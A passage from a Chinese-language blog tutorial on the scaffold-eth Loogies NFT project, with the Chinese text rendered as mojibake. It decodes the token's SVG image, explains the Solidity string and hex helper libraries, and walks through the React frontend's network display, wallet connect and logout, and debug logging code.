class="string">&quot;data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAwIiBoZWlnaHQ9IjQwMCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyBpZD0iZXllMSI+PGVsbGlwc2Ugc3Ryb2tlLXdpZHRoPSIzIiByeT0iMjkuNSIgcng9IjI5LjUiIGlkPSJzdmdfMSIgY3k9IjE1NC41IiBjeD0iMTgxLjUiIHN0cm9rZT0iIzAwMCIgZmlsbD0iI2ZmZiIvPjxlbGxpcHNlIHJ5PSIzLjUiIHJ4PSIyLjUiIGlkPSJzdmdfMyIgY3k9IjE1NC41IiBjeD0iMTczLjUiIHN0cm9rZS13aWR0aD0iMyIgc3Ryb2tlPSIjMDAwIiBmaWxsPSIjMDAwMDAwIi8+PC9nPjxnIGlkPSJoZWFkIj48ZWxsaXBzZSBmaWxsPSIjNGNjNGMxIiBzdHJva2Utd2lkdGg9IjMiIGN4PSIyMDQuNSIgY3k9IjIxMS44MDA2NSIgaWQ9InN2Z181IiByeD0iODgiIHJ5PSI1MS44MDA2NSIgc3Ryb2tlPSIjMDAwIi8+PC9nPjxnIGlkPSJleWUyIj48ZWxsaXBzZSBzdHJva2Utd2lkdGg9IjMiIHJ5PSIyOS41IiByeD0iMjkuNSIgaWQ9InN2Z18yIiBjeT0iMTY4LjUiIGN4PSIyMDkuNSIgc3Ryb2tlPSIjMDAwIiBmaWxsPSIjZmZmIi8+PGVsbGlwc2Ugcnk9IjMuNSIgcng9IjMiIGlkPSJzdmdfNCIgY3k9IjE2OS41IiBjeD0iMjA4IiBzdHJva2Utd2lkdGg9IjMiIGZpbGw9IiMwMDAwMDAiIHN0cm9rZT0iIzAwMCIvPjwvZz48L3N2Zz4=&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯¹ <code>image</code> å­—æ®µè¿›è¡Œè§£ç å¹¶æ ¼å¼åŒ–å°±å¾—åˆ°å›¾ç‰‡çš„ SVGï¼š</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.w3.org/2000/svg&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">&quot;eye1&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_1&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;154.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;181.5&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#fff&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">ry</span>=<span class="string">&quot;3.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;2.5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_3&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;154.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;173.5&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#000000&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">&quot;head&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">fill</span>=<span class="string">&quot;#4cc4c1&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;204.5&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;211.80065&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;88&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;51.80065&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">g</span> <span class="attr">id</span>=<span class="string">&quot;eye2&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">ry</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;29.5&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_2&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;168.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;209.5&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#fff&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">ellipse</span> <span class="attr">ry</span>=<span class="string">&quot;3.5&quot;</span> <span class="attr">rx</span>=<span class="string">&quot;3&quot;</span> <span class="attr">id</span>=<span class="string">&quot;svg_4&quot;</span> <span class="attr">cy</span>=<span class="string">&quot;169.5&quot;</span> <span class="attr">cx</span>=<span class="string">&quot;208&quot;</span> <span class="attr">stroke-width</span>=<span class="string">&quot;3&quot;</span> <span class="attr">fill</span>=<span class="string">&quot;#000000&quot;</span> <span class="attr">stroke</span>=<span class="string">&quot;#000&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">g</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure><p>SVGæ˜¯ä¸€ç§ç”¨ XML å®šä¹‰çš„è¯­è¨€ï¼Œç”¨æ¥æè¿°äºŒç»´çŸ¢é‡åŠçŸ¢é‡/æ …æ ¼å›¾å½¢ã€‚å®ƒå¯ä»¥ä»»æ„æ”¾å¤§å›¾å½¢æ˜¾ç¤ºï¼Œä¹Ÿä¸ä¼šç‰ºç‰²å›¾åƒè´¨é‡ï¼Œå®ƒå¯ä»¥ä½¿ç”¨ä»£ç è¿›è¡Œæè¿°ï¼Œæ–¹ä¾¿ç¼–è¾‘ï¼Œå› æ­¤è¢«å¹¿æ³›ä½¿ç”¨ã€‚</p><p>ä»ä¸Šé¢çš„ä»£ç ç»“åˆä»¥ä¸‹çš„å›¾åƒå¯ä»¥çœ‹å‡ºï¼Œè¿™ä¸ª SVG åŒ…å«å¦‚ä¸‹å†…å®¹ï¼š</p><ul><li>ç¬¬ä¸€è¡Œä¸º XML å£°æ˜ï¼Œæ ‡æ˜ç‰ˆæœ¬å’Œç¼–ç ç±»å‹ï¼Œä¹‹åæ˜¯SVG çš„å®½åº¦å’Œé«˜åº¦ï¼›</li><li><code>eye1</code>ï¼šç”±ä¸¤ä¸ªæ¤­åœ†ï¼ˆellipseï¼‰ç»˜åˆ¶çš„çœ¼åœˆå’Œé»‘è‰²çœ¼ç ï¼›</li><li><code>head</code>ï¼šå¡«å…… <code>#4cc4c1</code> é¢œè‰²çš„æ¤­åœ†ä½œä¸ºèº«ä½“ï¼›</li><li><code>eye2</code>ï¼šä¸ <code>eye1</code> ä¸€è‡´ï¼Œä½ç½®ä¸åŒï¼›</li></ul><p><code>eye1</code>ï¼Œ<code>head</code>å’Œ<code>eye2</code>ä¾æ¬¡å åŠ å¾—åˆ°æœ€ç»ˆçš„å›¾å½¢ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/153822497-6cdd7677-9594-4e78-8bc1-8f1b4c1158b8.png" alt="loogies-1"></p><h3><span id="fu-zhu-han-shu-jie-xi">è¾…åŠ©å‡½æ•°è§£æ</span></h3><ol><li><code>uint2str</code> å°† <code>uint</code> è½¬å˜ä¸ºå­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ <code>123</code> å˜ä¸º <code>'123'</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function uint2str(uint _i) internal pure returns (string memory _uintAsString) &#123;</span><br><span class="line">      if (_i == 0) &#123;</span><br><span class="line">          return &quot;0&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">      uint j = _i;</span><br><span class="line">// uint ä½æ•°</span><br><span class="line">      uint len;</span><br><span class="line">      while (j != 0) &#123;</span><br><span class="line">          len++;</span><br><span class="line">          j /= 10;</span><br><span class="line">      &#125;</span><br><span class="line">      bytes memory bstr = new bytes(len);</span><br><span class="line">      uint k = len;</span><br><span class="line">      while (_i != 0) &#123;</span><br><span class="line">          k = k-1;</span><br><span class="line">    // _i ä¸ªä½æ•°å­—</span><br><span class="line">          uint8 temp = (48 + uint8(_i - _i / 10 * 10));</span><br><span class="line">          bytes1 b1 = bytes1(temp);</span><br><span class="line">          bstr[k] = b1;</span><br><span class="line">          _i /= 10;</span><br><span class="line">      &#125;</span><br><span class="line">      return string(bstr);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><ol><li><code>ToColor.sol</code> åº“ï¼šå°† <code>byte3</code> ç±»å‹è½¬æ¢ä¸ºå‰ç«¯é¢œè‰²å­—ç¬¦ä¸²ï¼Œä¾‹å¦‚ï¼šè¾“å…¥ <code>0x4cc4c1</code> è¾“å‡º <code>'4cc4c1'</code></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library ToColor &#123;</span><br><span class="line">    bytes16 internal constant ALPHABET = &#x27;0123456789abcdef&#x27;;</span><br><span class="line"></span><br><span class="line">    function toColor(bytes3 value) internal pure returns (string memory) &#123;</span><br><span class="line">      bytes memory buffer = new bytes(6);</span><br><span class="line">      for (uint256 i = 0; i &lt; 3; i++) &#123;</span><br><span class="line">          buffer[i*2+1] = ALPHABET[uint8(value[i]) &amp; 0xf];</span><br><span class="line">          buffer[i*2] = ALPHABET[uint8(value[i]&gt;&gt;4) &amp; 0xf];</span><br><span class="line">      &#125;</span><br><span class="line">      return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>HexStrings.sol</code> åº“ï¼šä¸»è¦ä½œç”¨æ˜¯å°† <code>uint</code> æŒ‰ <code>length</code> ä½æå–ï¼Œå¯¹åº”äºç”Ÿæˆå…¬é’¥æ—¶æˆªå–å‰20ä½çš„åŠŸèƒ½ï¼š <code>(*uint160*(ownerOf(id))).toHexString(20)</code>ï¼Œæ­¤è¡¨è¾¾å¼ç”Ÿæˆå¯¹åº” <code>tokenId</code> æ‰€æœ‰è€…çš„åœ°å€ã€‚</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">library HexStrings &#123;</span><br><span class="line">    bytes16 internal constant ALPHABET = &#x27;0123456789abcdef&#x27;;</span><br><span class="line"></span><br><span class="line">    function toHexString(uint256 value, uint256 length) internal pure returns (string memory) &#123;</span><br><span class="line">        bytes memory buffer = new bytes(2 * length + 2);</span><br><span class="line">        buffer[0] = &#x27;0&#x27;;</span><br><span class="line">        buffer[1] = &#x27;x&#x27;;</span><br><span class="line">        for (uint256 i = 2 * length + 1; i &gt; 1; --i) &#123;</span><br><span class="line">            buffer[i] = ALPHABET[value &amp; 0xf];</span><br><span class="line">            value &gt;&gt;= 4;</span><br><span class="line">        &#125;</span><br><span class="line">        return string(buffer);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³æ­¤ï¼Œåˆçº¦æºç åˆ†æå®Œæˆã€‚</p><p>ä¸‹é¢æˆ‘ä»¬å°†å¯¹å‰ç«¯çš„é€»è¾‘è¿›è¡Œç®€è¦åˆ†æï¼Œç„¶åæˆ‘ä»¬å°†ä¸€æ­¥æ­¥å®ç° NFT é“¸é€ å’Œå±•ç¤ºçš„åŠŸèƒ½ã€‚å°†ä»£ç åˆ‡æ¢åˆ°å‰ç«¯ä»£ç æäº¤ä¹‹å‰ï¼ŒæŒ‰ç…§ä»¥ä¸‹çš„æ­¥éª¤ä¸€æ­¥æ­¥æ·»åŠ åŠŸèƒ½ã€‚</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git checkout a98156f6a03a0bc8fc98c8c77cef6fbf59f03b31</span><br></pre></td></tr></table></figure><h2><span id="qian-duan-luo-ji-fen-xi">å‰ç«¯é€»è¾‘åˆ†æ</span></h2><p>é¡¹ç›®å‰ç«¯æ–‡ä»¶åœ¨ <code>packages/react-app</code> å†…ï¼Œä»¥ä¸‹æ–‡ç« ä¸­æ¶‰åŠæ–‡ä»¶çš„ä½ç½®éƒ½å°†åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­å¯»æ‰¾ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆæ¥çœ‹ä¸€ä¸‹ <code>src/App.jsx</code> ï¼Œè¿™æ˜¯é¡¹ç›®çš„ä¸»è¦é¡µé¢ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»£ç ç¼–è¾‘å™¨æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶çš„ä¸»è¦éƒ¨åˆ†ï¼š</p><p><img src="https://user-images.githubusercontent.com/3297411/153822564-f2f96aa8-1336-475b-adc8-cc251405cdff.png" alt="Appjsx"></p><p>å…¶ä¸­åŒ…å«çš„åŠŸèƒ½å’Œç»„ä»¶åŒ…æ‹¬ï¼š</p><ul><li><code>Header</code>ï¼šæ ‡é¢˜æ ï¼Œæ˜¾ç¤ºæ ‡é¢˜</li><li><em><code>NetworkDisplay</code>ï¼šæ‰€å¤„ç½‘ç»œçŠ¶æ€</em></li><li><em><code>Menu</code>ï¼Œ <code>Switch</code>ï¼šèœå•åˆ‡æ¢</em></li><li><em><code>ThemeSwitch</code>ï¼šå³ä¸‹è§’æ˜æš—ä¸»é¢˜åˆ‡æ¢</em></li><li><em><code>Account</code>ï¼šå³ä¸Šè§’è´¦æˆ·ä¿¡æ¯ç»„ä»¶</em></li><li>æ¥ä¸‹æ¥çš„ä¸¤ä¸ª <code>Row</code> å¯¹åº”å·¦ä¸‹è§’çš„ Gas æ˜¾ç¤ºã€æ”¯æŒå’Œæœ¬åœ°çš„æ°´é¾™å¤´</li></ul><p>ä¸‹é¢æˆ‘ä»¬ä¸»è¦çœ‹ä¸€ä¸‹ <em><code>NetworkDisplay</code>å’Œ <code>Account</code> çš„é€»è¾‘å®ç°ï¼Œä»¥åŠ <code>Menu</code>ï¼Œ <code>Switch</code> ä¸­çš„åŠŸèƒ½ã€‚</em></p><h3><span id="networkdisplay"><em><code>NetworkDisplay</code></em></span></h3><p>ç»„ä»¶ä½ç½®ï¼š <code>src/components/NetworkDisplay.jsx</code></p><p>ä¸»è¦åŒ…å«ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ol><li>æ˜¾ç¤ºå½“å‰æ‰€é€‰æ‹©çš„ç½‘ç»œåç§°ï¼›</li><li>å¦‚æœå½“å‰é’±åŒ…æ‰€åœ¨ç½‘ç»œä¸é¡¹ç›®ä¸­ç½‘ç»œè®¾ç½®ä¸ä¸€è‡´ï¼Œåˆ™æç¤ºè­¦å‘Šï¼Œå…¶ä¸­ï¼Œå½“é€‰æ‹©æœ¬åœ°ç½‘ç»œæ˜¯ï¼Œç½‘ç»œ ID éœ€è¦è®¾ç½®ä¸º <code>31337</code> ã€‚</li></ol><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">NetworkDisplay</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  NETWORKCHECK,</span></span><br><span class="line"><span class="params">  localChainId,</span></span><br><span class="line"><span class="params">  selectedChainId,</span></span><br><span class="line"><span class="params">  targetNetwork,</span></span><br><span class="line"><span class="params">  USE_NETWORK_SELECTOR,</span></span><br><span class="line"><span class="params">  logoutOfWeb3Modal,</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> networkDisplay = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="variable constant_">NETWORKCHECK</span> &amp;&amp; localChainId &amp;&amp; selectedChainId &amp;&amp; localChainId !== selectedChainId) &#123;</span><br><span class="line">    <span class="keyword">const</span> networkSelected = <span class="title function_">NETWORK</span>(selectedChainId);</span><br><span class="line">    <span class="keyword">const</span> networkLocal = <span class="title function_">NETWORK</span>(localChainId);</span><br><span class="line">    <span class="keyword">if</span> (selectedChainId === <span class="number">1337</span> &amp;&amp; localChainId === <span class="number">31337</span>) &#123;</span><br><span class="line"><span class="comment">// æç¤ºé”™è¯¯çš„ç½‘ç»œID</span></span><br><span class="line">...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// æç¤ºç½‘ç»œé”™è¯¯</span></span><br><span class="line">...</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    networkDisplay = <span class="variable constant_">USE_NETWORK_SELECTOR</span> ? <span class="literal">null</span> : (</span><br><span class="line">      <span class="comment">// æ˜¾ç¤ºç½‘ç»œåç§°</span></span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&#123;&#123;</span> <span class="attr">zIndex:</span> <span class="attr">-1</span>, <span class="attr">position:</span> &quot;<span class="attr">absolute</span>&quot;, <span class="attr">right:</span> <span class="attr">154</span>, <span class="attr">top:</span> <span class="attr">28</span>, <span class="attr">padding:</span> <span class="attr">16</span>, <span class="attr">color:</span> <span class="attr">targetNetwork.color</span> &#125;&#125;&gt;</span></span></span><br><span class="line"><span class="language-xml">        &#123;targetNetwork.name&#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(&#123; networkDisplay &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> networkDisplay;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="account"><em><code>Account</code></em></span></h3><p>ç»„ä»¶ä½ç½®ï¼š <code>src/components/Account.jsx</code></p><p>ä¸»è¦åŒ…å«ä¸¤ä¸ªåŠŸèƒ½ï¼š</p><ol><li>æ˜¾ç¤ºå½“å‰é’±åŒ…</li><li>æ˜¾ç¤ºé’±åŒ…ä½™é¢</li><li>æ˜¾ç¤º <code>Connect</code> æˆ–è€… <code>Logout</code></li></ol><p>å…¶ä¸­ï¼Œå½“ç”¨æˆ·ç‚¹å‡» <code>Connect</code> æ—¶ï¼Œå‰ç«¯è°ƒç”¨ <em><code>loadWeb3Modal</code>ï¼Œä»£ç å¦‚ä¸‹ï¼Œè¿™ä¸ªå‡½æ•°çš„éœ€è¦åŠŸèƒ½æ˜¯ä¸MetaMaskç­‰é’±åŒ…è¿›è¡Œè¿æ¥ï¼Œå¹¶ç›‘å¬é’±åŒ…çš„</em>  <code>chainChanged</code>ï¼Œ<code>accountsChanged</code> å’Œ <code>disconnect</code> äº‹ä»¶ï¼Œå³å½“æˆ‘ä»¬åœ¨é’±åŒ…ä¸­åˆ‡æ¢ç½‘ç»œï¼Œé€‰æ‹©è¿æ¥è´¦æˆ·ä»¥åŠå–æ¶ˆè¿æ¥æ—¶å¯¹åº”ä¿®æ”¹æ˜¾ç¤ºçŠ¶æ€ã€‚</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> loadWeb3Modal = <span class="title function_">useCallback</span>(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line"><span class="comment">// è¿æ¥é’±åŒ…</span></span><br><span class="line">  <span class="keyword">const</span> provider = <span class="keyword">await</span> web3Modal.<span class="title function_">connect</span>();</span><br><span class="line">  <span class="title function_">setInjectedProvider</span>(<span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">Web3Provider</span>(provider));</span><br><span class="line"><span class="comment">// ç›‘å¬åˆ‡æ¢ç½‘ç»œ</span></span><br><span class="line">  provider.<span class="title function_">on</span>(<span class="string">&quot;chainChanged&quot;</span>, <span class="function"><span class="params">chainId</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`chain changed to <span class="subst">$&#123;chainId&#125;</span>! updating providers`</span>);</span><br><span class="line">    <span class="title function_">setInjectedProvider</span>(<span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">Web3Provider</span>(provider));</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// ç›‘å¬åˆ‡æ¢è´¦æˆ·</span></span><br><span class="line">  provider.<span class="title function_">on</span>(<span class="string">&quot;accountsChanged&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`account changed!`</span>);</span><br><span class="line">    <span class="title function_">setInjectedProvider</span>(<span class="keyword">new</span> ethers.<span class="property">providers</span>.<span class="title class_">Web3Provider</span>(provider));</span><br><span class="line">  &#125;);</span><br><span class="line"><span class="comment">// ç›‘å¬æ–­å¼€è¿æ¥</span></span><br><span class="line">  <span class="comment">// Subscribe to session disconnection</span></span><br><span class="line">  provider.<span class="title function_">on</span>(<span class="string">&quot;disconnect&quot;</span>, <span class="function">(<span class="params">code, reason</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(code, reason);</span><br><span class="line">    <span class="title function_">logoutOfWeb3Modal</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">// eslint-disable-next-line</span></span><br><span class="line">&#125;, [setInjectedProvider]);</span><br></pre></td></tr></table></figure><p>åŒç†ï¼Œåœ¨è¿æ¥é’±åŒ…æƒ…å†µä¸‹ï¼Œç”¨æˆ·ç‚¹å‡» <code>Logout</code> ä¼šè°ƒç”¨ <code>logoutOfWeb3Modal</code> åŠŸèƒ½ï¼Œ</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">logoutOfWeb3Modal</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line"><span class="comment">// æ¸…æ¥šç¼“å­˜çš„ç½‘ç»œæä¾›å•†ï¼Œå¹¶æ–­å¼€è¿æ¥</span></span><br><span class="line">    <span class="keyword">await</span> web3Modal.<span class="title function_">clearCachedProvider</span>();</span><br><span class="line">    <span class="keyword">if</span> (injectedProvider &amp;&amp; injectedProvider.<span class="property">provider</span> &amp;&amp; <span class="keyword">typeof</span> injectedProvider.<span class="property">provider</span>.<span class="property">disconnect</span> == <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">await</span> injectedProvider.<span class="property">provider</span>.<span class="title function_">disconnect</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">reload</span>();</span><br><span class="line">    &#125;, <span class="number">1</span>);</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure><h3><span id="menu-switch"><em><code>Menu</code>ï¼Œ <code>Switch</code></em></span></h3><p>è¿™ä¸¤ä¸ªåˆ†åˆ«å¯¹åº”æ˜¾ç¤ºèœå•å’Œå¯¹åº”åˆ‡æ¢èœå•åŠŸèƒ½ï¼Œè¿™äº›èœå•åŒ…æ‹¬ï¼š</p><ul><li><code>App Home</code> ï¼šé¡¹ç›®å¸Œæœ›æˆ‘ä»¬å°†éœ€è¦å®ç°çš„åŠŸèƒ½æ”¾åœ¨è¿™ä¸ªèœå•ä¸­ï¼Œæ¯”å¦‚æˆ‘ä»¬å°†è¦å®ç°çš„ NFT çš„é“¸é€ å’Œå±•ç¤ºåŠŸèƒ½ï¼›</li><li><code>Debug Contracts</code>ï¼šè°ƒè¯•è‡ªå·±ç¼–å†™çš„åˆçº¦åŠŸèƒ½ï¼Œå°†ä¼šæ ¹æ®åˆçº¦çš„ ABI æ–‡ä»¶ å±•ç¤ºå¯ä»¥åˆçº¦çš„çŠ¶æ€å˜é‡å’Œå¯ä»¥è°ƒç”¨çš„å‡½æ•°ï¼›</li><li><code>Hints</code>ï¼šç¼–ç¨‹æç¤º</li><li><code>ExampleUI</code>ï¼šç¤ºä¾‹UIï¼Œå¯ä»¥åšä¸ºç¼–ç¨‹ä½¿ç”¨</li><li><code>Mainnet DAI</code>ï¼šä»¥å¤ªåŠä¸»ç½‘ <code>DAI</code> çš„åˆçº¦çŠ¶æ€å’Œå¯ç”¨å‡½æ•°ï¼Œä¸ <code>Debug Contracts</code> åŠŸèƒ½ä¸€ç›´</li><li><code>Subgraph</code>ï¼šä½¿ç”¨ The Graph åè®®å¯¹åˆçº¦ä¸­çš„äº‹ä»¶è¿›è¡Œç›‘å¬å’ŒæŸ¥è¯¢ã€‚</li></ul><h3><span id="diao-shi-xin-xi">è°ƒè¯•ä¿¡æ¯</span></h3><p><code>App.jsx</code> ä¸­è¿˜åŒ…å«äº†æ‰“å°å½“å‰é¡µé¢çŠ¶æ€çš„è°ƒè¯•ä¿¡æ¯ï¼Œå¯ä»¥åœ¨å¼€å‘çš„è¿‡ç¨‹ä¸­å®æ—¶æŸ¥çœ‹å½“å‰çŠ¶æ€å˜é‡ã€‚</p><figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// ğŸ§« DEBUG ğŸ‘¨ğŸ»â€ğŸ”¬</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (</span><br><span class="line">    <span class="variable constant_">DEBUG</span> &amp;&amp;</span><br><span class="line">    mainnetProvider &amp;&amp;</span><br><span class="line">    address &amp;&amp;</span><br><span class="line">    selectedChainId &amp;&amp;</span><br><span class="line">    yourLocalBalance &amp;&amp;</span><br><span class="line">    yourMainnetBalance &amp;&amp;</span><br><span class="line">    readContracts &amp;&amp;</span><br><span class="line">    writeContracts &amp;&amp;</span><br><span class="line">    mainnetContracts</span><br><span class="line">  ) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;_____________________________________ ğŸ— scaffold-eth _____________________________________&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸŒ mainnetProvider&quot;</span>, mainnetProvider);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ  localChainId&quot;</span>, localChainId);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ‘©â€ğŸ’¼ selected address:&quot;</span>, address);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ•µğŸ»â€â™‚ï¸ selectedChainId:&quot;</span>, selectedChainId);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ’µ yourLocalBalance&quot;</span>, yourLocalBalance ? ethers.<span class="property">utils</span>.<span class="title function_">formatEther</span>(yourLocalBalance) : <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ’µ yourMainnetBalance&quot;</span>, yourMainnetBalance ? ethers.<span class="property">utils</span>.<span class="title function_">formatEther</span>(yourMainnetBalance) : <span class="string">&quot;...&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ“ readContracts&quot;</span>, readContracts);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸŒ DAI contract on mainnet:&quot;</span>, mainnetContracts);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ’µ yourMainnetDAIBalance&quot;</span>, myMainnetDAIBalance);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ğŸ” writeContracts&quot;</span>, writeContracts);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, [</span><br><span class="line">  mainnetProvider,</span><br><span class="line">  address,</span><br><span class="line">  selectedChainId,</span><br><span class="line">  yourLocalBalance,</span><br><span class="line">  yourMainnetBalance,</span><br><span class="line">  readContracts,</span><br><span class="line">  writeContracts,</span><br><span class="line">  mainnetContracts,</span><br><span class="line">  localChainId,</span><br><span class="line">  myMainnetDAIBalance,</span><br><span class="line">]);</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹å®Œä¸»é¡µçš„åŸºæœ¬åŠŸèƒ½ï¼Œä¸‹é¢æˆ‘ä»¬å¼€å§‹å®ç° NFT é“¸é€ å’Œå±•ç¤º NFT åˆ—è¡¨è¿™ä¸¤ä¸ªåŠŸèƒ½ã€‚</p><h2><span 